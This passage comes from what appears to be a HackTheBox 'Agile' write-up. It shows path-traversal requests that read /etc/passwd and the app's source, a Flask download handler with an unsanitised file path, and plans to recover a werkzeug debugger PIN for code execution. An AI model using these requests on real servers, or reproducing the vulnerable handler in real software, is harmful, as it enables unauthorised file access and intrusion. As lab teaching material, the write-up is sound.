</span></span></code></pre></td></tr></table></div></div><h2 id=foothold>Foothold</h2><p>So we have <em>some</em> secret (JWT signing key?). Oh, let&rsquo;s try LFI with a basic path traversal by modifying our CSV download GET HTTP request:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /download?fn=../../../etc/passwd HTTP/1.1
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Server: nginx/1.18.0 (Ubuntu)
</span></span><span class=line><span class=cl>Date: Sun, 19 Mar 2023 06:00:28 GMT
</span></span><span class=line><span class=cl>Content-Type: text/csv; charset=utf-8
</span></span><span class=line><span class=cl>Content-Length: 1744
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Disposition: attachment; filename=superpass_export.csv
</span></span><span class=line><span class=cl>Vary: Cookie
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>bin❌2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sys❌3:3:sys:/dev:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sync❌4:65534:sync:/bin:/bin/sync
</span></span><span class=line><span class=cl>games❌5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class=line><span class=cl>man❌6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span class=line><span class=cl>lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>mail❌8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span class=line><span class=cl>news❌9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class=line><span class=cl>uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span class=line><span class=cl>proxy❌13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span class=line><span class=cl>backup❌34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class=line><span class=cl>list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span class=line><span class=cl>irc❌39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span class=line><span class=cl>nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>_apt❌100:65534::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-network❌101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-resolve❌102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>messagebus❌103:104::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-timesync❌104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>pollinate❌105:1::/var/cache/pollinate:/bin/false
</span></span><span class=line><span class=cl>sshd❌106:65534::/run/sshd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>usbmux❌107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span class=line><span class=cl>corum❌1000:1000:corum:/home/corum:/bin/bash
</span></span><span class=line><span class=cl>dnsmasq❌108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
</span></span><span class=line><span class=cl>mysql❌109:112:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span class=line><span class=cl>runner❌1001:1001::/app/app-testing/:/bin/sh
</span></span><span class=line><span class=cl>edwards❌1002:1002::/home/edwards:/bin/bash
</span></span><span class=line><span class=cl>dev_admin❌1003:1003::/home/dev_admin:/bin/bash
</span></span><span class=line><span class=cl>_laurel❌999:999::/var/log/laurel:/bin/false
</span></span></code></pre></td></tr></table></div></div><p>So this actually works, and we can see the following &lsquo;real&rsquo; users who have a valid login shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>grep -vE <span class=s2>&#34;nologin|false&#34;</span> users.txt 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>sync❌4:65534:sync:/bin:/bin/sync
</span></span><span class=line><span class=cl>corum❌1000:1000:corum:/home/corum:/bin/bash
</span></span><span class=line><span class=cl>runner❌1001:1001::/app/app-testing/:/bin/sh
</span></span><span class=line><span class=cl>edwards❌1002:1002::/home/edwards:/bin/bash
</span></span><span class=line><span class=cl>dev_admin❌1003:1003::/home/dev_admin:/bin/bash
</span></span><span class=line><span class=cl>_laurel❌999:999::/var/log/laurel:/
</span></span></code></pre></td></tr></table></div></div><p>So it looks like we&rsquo;re dealing with an Ubuntu machine running a Python Flask based web app on nginx/1.18. The app is a basic password manager/vault that let&rsquo;s us download a CSV of our stored credentials. If the file doesn&rsquo;t exist, we get a valuable
stack trace containing a secret in a javascript <code>&lt;script></code> tag.</p><p>We can also do path traversal to give us local file inclusion.</p><p>The stack trace above refers to <code>/app/app/superpass/views/vault_view.py</code>. We can retrieve this to see how the app works, by calling <code>GET /download?fn=../../../app/app/superpass/views/vault_views.py HTTP/1.1</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Server: nginx/1.18.0 (Ubuntu)
</span></span><span class=line><span class=cl>Date: Sun, 19 Mar 2023 06:05:20 GMT
</span></span><span class=line><span class=cl>Content-Type: text/csv; charset=utf-8
</span></span><span class=line><span class=cl>Content-Length: 2987
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Disposition: attachment; filename=superpass_export.csv
</span></span><span class=line><span class=cl>Vary: Cookie
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>import flask
</span></span><span class=line><span class=cl>import subprocess
</span></span><span class=line><span class=cl>from flask_login import login_required, current_user
</span></span><span class=line><span class=cl>from superpass.infrastructure.view_modifiers import response
</span></span><span class=line><span class=cl>import superpass.services.password_service as password_service
</span></span><span class=line><span class=cl>from superpass.services.utility_service import get_random
</span></span><span class=line><span class=cl>from superpass.data.password import Password
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>blueprint = flask.Blueprint(&#39;vault&#39;, __name__, template_folder=&#39;templates&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>@blueprint.route(&#39;/vault&#39;)
</span></span><span class=line><span class=cl>@response(template_file=&#39;vault/vault.html&#39;)
</span></span><span class=line><span class=cl>@login_required
</span></span><span class=line><span class=cl>def vault():
</span></span><span class=line><span class=cl>    passwords = password_service.get_passwords_for_user(current_user.id)
</span></span><span class=line><span class=cl>    print(f&#39;{passwords=}&#39;)
</span></span><span class=line><span class=cl>    return {&#39;passwords&#39;: passwords}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>@blueprint.get(&#39;/vault/add_row&#39;)
</span></span><span class=line><span class=cl>@response(template_file=&#39;vault/partials/password_row_editable.html&#39;)
</span></span><span class=line><span class=cl>@login_required
</span></span><span class=line><span class=cl>def add_row():
</span></span><span class=line><span class=cl>    p = Password()
</span></span><span class=line><span class=cl>    p.password = get_random(20)
</span></span><span class=line><span class=cl>    return {&#34;p&#34;: p}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>@blueprint.get(&#39;/vault/edit_row/&lt;id&gt;&#39;)
</span></span><span class=line><span class=cl>@response(template_file=&#39;vault/partials/password_row_editable.html&#39;)
</span></span><span class=line><span class=cl>@login_required
</span></span><span class=line><span class=cl>def get_edit_row(id):
</span></span><span class=line><span class=cl>    password = password_service.get_password_by_id(id, current_user.id)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    return {&#34;p&#34;: password}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>@blueprint.get(&#39;/vault/row/&lt;id&gt;&#39;)
</span></span><span class=line><span class=cl>@response(template_file=&#39;vault/partials/password_row.html&#39;)
</span></span><span class=line><span class=cl>@login_required
</span></span><span class=line><span class=cl>def get_row(id):
</span></span><span class=line><span class=cl>    password = password_service.get_password_by_id(id, current_user.id)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    return {&#34;p&#34;: password}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>@blueprint.post(&#39;/vault/add_row&#39;)
</span></span><span class=line><span class=cl>@login_required
</span></span><span class=line><span class=cl>def add_row_post():
</span></span><span class=line><span class=cl>    r = flask.request
</span></span><span class=line><span class=cl>    site = r.form.get(&#39;url&#39;, &#39;&#39;).strip()
</span></span><span class=line><span class=cl>    username = r.form.get(&#39;username&#39;, &#39;&#39;).strip()
</span></span><span class=line><span class=cl>    password = r.form.get(&#39;password&#39;, &#39;&#39;).strip()
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if not (site or username or password):
</span></span><span class=line><span class=cl>        return &#39;&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    p = password_service.add_password(site, username, password, current_user.id)
</span></span><span class=line><span class=cl>    return flask.render_template(&#39;vault/partials/password_row.html&#39;, p=p)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>@blueprint.post(&#39;/vault/update/&lt;id&gt;&#39;)
</span></span><span class=line><span class=cl>@response(template_file=&#39;vault/partials/password_row.html&#39;)
</span></span><span class=line><span class=cl>@login_required
</span></span><span class=line><span class=cl>def update(id):
</span></span><span class=line><span class=cl>    r = flask.request
</span></span><span class=line><span class=cl>    site = r.form.get(&#39;url&#39;, &#39;&#39;).strip()
</span></span><span class=line><span class=cl>    username = r.form.get(&#39;username&#39;, &#39;&#39;).strip()
</span></span><span class=line><span class=cl>    password = r.form.get(&#39;password&#39;, &#39;&#39;).strip()
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if not (site or username or password):
</span></span><span class=line><span class=cl>        flask.abort(500)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    p = password_service.update_password(id, site, username, password, current_user.id)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    return {&#34;p&#34;: p}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>@blueprint.delete(&#39;/vault/delete/&lt;id&gt;&#39;)
</span></span><span class=line><span class=cl>@login_required
</span></span><span class=line><span class=cl>def delete(id):
</span></span><span class=line><span class=cl>    password_service.delete_password(id, current_user.id)
</span></span><span class=line><span class=cl>    return &#39;&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>@blueprint.get(&#39;/vault/export&#39;)
</span></span><span class=line><span class=cl>@login_required
</span></span><span class=line><span class=cl>def export():
</span></span><span class=line><span class=cl>    if current_user.has_passwords:        
</span></span><span class=line><span class=cl>        fn = password_service.generate_csv(current_user)
</span></span><span class=line><span class=cl>        return flask.redirect(f&#39;/download?fn={fn}&#39;, 302)
</span></span><span class=line><span class=cl>    return &#34;No passwords for user&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>@blueprint.get(&#39;/download&#39;)
</span></span><span class=line><span class=cl>@login_required
</span></span><span class=line><span class=cl>def download():
</span></span><span class=line><span class=cl>    r = flask.request
</span></span><span class=line><span class=cl>    fn = r.args.get(&#39;fn&#39;)
</span></span><span class=line><span class=cl>    with open(f&#39;/tmp/{fn}&#39;, &#39;rb&#39;) as f:
</span></span><span class=line><span class=cl>        data = f.read()
</span></span><span class=line><span class=cl>    resp = flask.make_response(data)
</span></span><span class=line><span class=cl>    resp.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=superpass_export.csv&#39;
</span></span><span class=line><span class=cl>    resp.mimetype = &#39;text/csv&#39;
</span></span><span class=line><span class=cl>    return resp
</span></span></code></pre></td></tr></table></div></div><p>I went down a rabbit hole, thinking the secret above was for an exposed JWT signing key. When backtracking, and attempting to download an invalid vault CSV file, I found the page is using the werkzeug debugger - see <a href=https://werkzeug.palletsprojects.com/en/2.2.x/debug/ target=_blank rel="noopener noreffer">Debugging Applications — Werkzeug Documentation (2.2.x)</a>. This provides a <em>middleware that renders nice trace-backs, optionally with an interactive debug console to execute code in any frame</em>.</p><p>There is a <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug target=_blank rel="noopener noreffer">HackTricks werkzeug</a> page with details on how to get console RCE.</p><p>I tried clicking on the stack trace, and it asks for a PIN &ndash; so we enter our secret:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/2023-08-06-agile-htb/assets/2023-03-19-18-47-13-image.png data-srcset="/2023-08-06-agile-htb/assets/2023-03-19-18-47-13-image.png, /2023-08-06-agile-htb/assets/2023-03-19-18-47-13-image.png 1.5x, /2023-08-06-agile-htb/assets/2023-03-19-18-47-13-image.png 2x" data-sizes=auto alt=/2023-08-06-agile-htb/assets/2023-03-19-18-47-13-image.png title=/2023-08-06-agile-htb/assets/2023-03-19-18-47-13-image.png width=1613 height=476></p><p>This gives an <code>incorrect pin</code> error. Yep, I was being lazy and assuming an easy bypass..</p><p>HackTricks mentions you can reverse engineer the algorithm used to derive the PIN by looking at e.g. <code>/python3.5/site-packages/werkzeug/debug/__init__.py</code></p><p>From our stack trace, we work out the correct path for werkzeug, and try the following LFI to read <code>/app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /download?fn=../../../app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py HTTP/1.1
</span></span><span class=line><span class=cl>Host: superpass.htb
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>DNT: 1
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Cookie: session=.eJy9jk1qwzAQha8iZm2KJI9GGp-i-xLCSBrFBrcJlrMKuXsFvUNXj8f74XvBte3SV-2wfL3AnEPgW3uXm8IEn7tKV7Pfb2b7MefdSCkjNOe6dfMYnQ-4vKd_3l2mAX1oX2E5j6cOt1VYALlmx61pTjXGhOixVVtKSLFIFSGpDWeRHIkyBs3sQmCLwjIHKoTNBk7quQkl710pXplnDhibsiWuQVJUJ9Qo0eyrJLE4TmIKlmMZ-Ndn1-OPxjt4_wIcJ2t7.ZBaZAA.8XRrRgigTWhr28G4u9SW_oL8u4A;remember_token=21|375c7a4d26553e4e568b19ac19f945febe04f81248efe05bbcc6c522853c580393454491f9638fd8999ce58ac91e2919d49448ed7b9e3db167a61c9934a433ae
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Referer: http://superpass.htb/vault/export
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span><span class=lnt>357
</span><span class=lnt>358
</span><span class=lnt>359
</span><span class=lnt>360
</span><span class=lnt>361
</span><span class=lnt>362
</span><span class=lnt>363
